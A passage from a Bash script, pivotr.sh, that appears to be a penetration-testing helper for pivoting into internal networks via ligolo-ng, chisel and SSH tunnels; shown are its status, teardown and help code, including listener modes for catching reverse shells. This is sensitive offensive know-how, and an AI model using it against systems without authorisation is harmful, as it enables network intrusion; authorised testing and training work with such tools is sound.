#==============================================================================
# MODE: status
#==============================================================================
mode_status() {
    phase "Pivot Infrastructure Status"

    echo ""
    echo -e "${BOLD}${CYAN}── TUN Interfaces ─────────────────────────────────────────${NC}"
    ip tuntap show 2>/dev/null || echo "  (none)"

    echo ""
    echo -e "${BOLD}${CYAN}── Routes via ligolo interfaces ───────────────────────────${NC}"
    ip route show 2>/dev/null | grep ligolo || echo "  (none)"

    echo ""
    echo -e "${BOLD}${CYAN}── Running ligolo-proxy processes ─────────────────────────${NC}"
    pgrep -a ligolo-proxy 2>/dev/null || echo "  (none)"

    echo ""
    echo -e "${BOLD}${CYAN}── Running chisel processes ───────────────────────────────${NC}"
    pgrep -a chisel 2>/dev/null || echo "  (none)"

    echo ""
    echo -e "${BOLD}${CYAN}── Python http.server processes ───────────────────────────${NC}"
    pgrep -af "http.server" 2>/dev/null || echo "  (none)"

    echo ""
}

#==============================================================================
# MODE: teardown
#==============================================================================
mode_teardown() {
    local tun_name="ligolo"
    local tun2_name="ligolo2"
    local subnet=""
    local remove_all=false

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --tun-name)
                [[ $# -lt 2 ]] && { error "--tun-name requires an argument"; return 1; }
                tun_name="$2"; shift 2 ;;
            --tun2-name)
                [[ $# -lt 2 ]] && { error "--tun2-name requires an argument"; return 1; }
                tun2_name="$2"; shift 2 ;;
            --subnet)
                [[ $# -lt 2 ]] && { error "--subnet requires an argument"; return 1; }
                subnet="$2"; shift 2 ;;
            --all)
                remove_all=true; shift ;;
            *)
                error "Unknown option: $1"; return 1 ;;
        esac
    done

    phase "Teardown"

    local did_something=false
    local had_errors=false

    local state_pid state_label
    while IFS=$'\t' read -r state_pid state_label; do
        [[ -n "$state_pid" ]] || continue
        if kill -0 "$state_pid" 2>/dev/null; then
            kill "$state_pid" 2>/dev/null && \
                success "Killed tracked ${state_label} (PID ${state_pid})" && did_something=true
        fi
        remove_state_entry "process" "$state_pid"
    done < <(get_state_entries "process")

    # Remove routes
    if [[ -n "$subnet" ]]; then
        if route_exists "$subnet"; then
            if sudo ip route del "$subnet" 2>/dev/null; then
                success "Removed route ${subnet}"
                did_something=true
                remove_state_entry "route" "$subnet"
            else
                error "Failed to remove route ${subnet}"
                had_errors=true
            fi
        else
            warn "Route ${subnet} not found — skipping"
        fi
    elif [[ "$remove_all" == true ]]; then
        local tracked_subnet tracked_iface
        while IFS=$'\t' read -r tracked_subnet tracked_iface; do
            [[ -n "$tracked_subnet" ]] || continue
            if route_exists "$tracked_subnet"; then
                if sudo ip route del "$tracked_subnet" 2>/dev/null; then
                    success "Removed tracked route ${tracked_subnet}"
                    did_something=true
                else
                    error "Failed to remove tracked route ${tracked_subnet}"
                    had_errors=true
                fi
            fi
            remove_state_entry "route" "$tracked_subnet"
        done < <(get_state_entries "route")
    fi

    # Remove TUN interfaces
    if [[ "$remove_all" == true ]]; then
        local iface
        local tracked_iface
        declare -A tracked_tuns=()
        while IFS=$'\t' read -r tracked_iface _; do
            [[ -n "$tracked_iface" ]] || continue
            tracked_tuns["$tracked_iface"]=1
        done < <(get_state_entries "tun")

        for iface in "${!tracked_tuns[@]}"; do
            if ! tun_exists "$iface"; then
                remove_state_entry "tun" "$iface"
                continue
            fi
            ip route show dev "$iface" 2>/dev/null | awk '{print $1}' | while read -r r; do
                sudo ip route del "$r" dev "$iface" 2>/dev/null || true
                remove_state_entry "route" "$r"
            done
            if sudo ip tuntap del mode tun "$iface" 2>/dev/null; then
                success "Removed tracked TUN interface ${iface}"
                did_something=true
                remove_state_entry "tun" "$iface"
            else
                error "Failed to remove tracked TUN interface ${iface}"
                had_errors=true
            fi
        done
        if [[ ${#tracked_tuns[@]} -eq 0 ]]; then
            warn "No tracked TUN interfaces found for --all"
        fi
    else
        for tun in "$tun_name" "$tun2_name"; do
            if tun_exists "$tun"; then
                ip route show dev "$tun" 2>/dev/null | awk '{print $1}' | while read -r r; do
                    sudo ip route del "$r" dev "$tun" 2>/dev/null || true
                    remove_state_entry "route" "$r"
                done
                if sudo ip tuntap del mode tun "$tun" 2>/dev/null; then
                    success "Removed TUN interface ${tun}"
                    did_something=true
                    remove_state_entry "tun" "$tun"
                else
                    error "Failed to remove TUN interface ${tun}"
                    had_errors=true
                fi
            fi
        done
    fi

    if [[ "$did_something" == false && "$had_errors" == false ]]; then
        warn "Nothing to clean up"
    elif [[ "$did_something" == true && "$had_errors" == false ]]; then
        success "Teardown complete"
    fi
}

#==============================================================================
# HELP
#==============================================================================
show_help() {
    cat <<'EOF'

pivotr.sh — Kali-side Pivot Setup and Reference Assistant

USAGE:
  ./pivotr.sh <mode> [options]

MODES:
  ligolo   --subnet CIDR [--pivot-ip IP] [--port 11601] [--tun-name ligolo]
           [--kali-ip IP] [--serve] [--serve-port 80]
           → Creates TUN, adds route, starts ligolo-proxy, prints next steps

  ligolo2  --subnet CIDR [--tun-name ligolo2]
           → Adds second TUN + route for double pivot; prints console cmds

  listener --port PORT [--port PORT ...] [--type shell|file|both]
           → Prints listener_add commands to paste into Ligolo console

  ssh      --type local|dynamic|remote|remote-dynamic --pivot-ip IP
           [--pivot-user USER] [--pivot-port 22] [--target-ip IP]
           [--target-port PORT] [--local-port PORT] [--socks-port 9999]
           [--kali-ip IP] [--kali-user kali]
           → Prints fully resolved SSH tunnel command + proxychains config

  chisel   [--kali-ip IP] [--port 8080] [--type socks|forward]
           [--target-ip IP] [--target-port PORT] [--local-port PORT]
           [--socks-port 9999] [--start-server]
           → Prints chisel server/client commands; optionally starts server

  status   → Show TUN interfaces, routes, running pivot processes

  teardown [--tun-name ligolo] [--tun2-name ligolo2] [--subnet CIDR] [--all]
           → Kill proxy/chisel, remove routes and TUN interfaces

EXAMPLES:
  ./pivotr.sh ligolo --subnet 10.10.10.0/24 --pivot-ip 10.10.10.5 --serve
  ./pivotr.sh ligolo2 --subnet 172.16.1.0/24
  ./pivotr.sh listener --port 4444 --port 80 --type shell
  ./pivotr.sh ssh --type dynamic --pivot-ip 10.10.10.5 --pivot-user www-data
  ./pivotr.sh ssh --type local --pivot-ip 10.10.10.5 --target-ip 10.10.11.1 --target-port 3389
  ./pivotr.sh chisel --type socks --start-server
  ./pivotr.sh teardown --all

NOTES:
  - Ligolo proxy binary: apt install ligolo-ng
  - Agent binaries: apt install ligolo-ng-common-binaries
  - Shell catcher: penelope -p PORT -O  (preferred over netcat)
  - proxychains nmap: always use -sT -Pn (TCP connect, no ping)
  - 240.0.0.1 = pivot's localhost in Ligolo tunnel

EOF
}

#==============================================================================
# MAIN
#==============================================================================
main() {
    # Parse global flags before mode dispatch
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --no-color) disable_colors; shift ;;
            *)          break ;;
        esac
    done

    if [[ $# -eq 0 ]]; then
        show_help
        exit 0
    fi

    local mode="$1"
    shift

    case "$mode" in
        ligolo)        mode_ligolo "$@" ;;
        ligolo2)       mode_ligolo2 "$@" ;;
        listener)      mode_listener "$@" ;;
        ssh)           mode_ssh "$@" ;;
        chisel)        mode_chisel "$@" ;;
        status)        mode_status "$@" ;;
        teardown)      mode_teardown "$@" ;;
        -h|--help|help) show_help ;;
        *)
            error "Unknown mode: ${mode}"
            show_help
            exit 1
            ;;
    esac
}

main "$@"
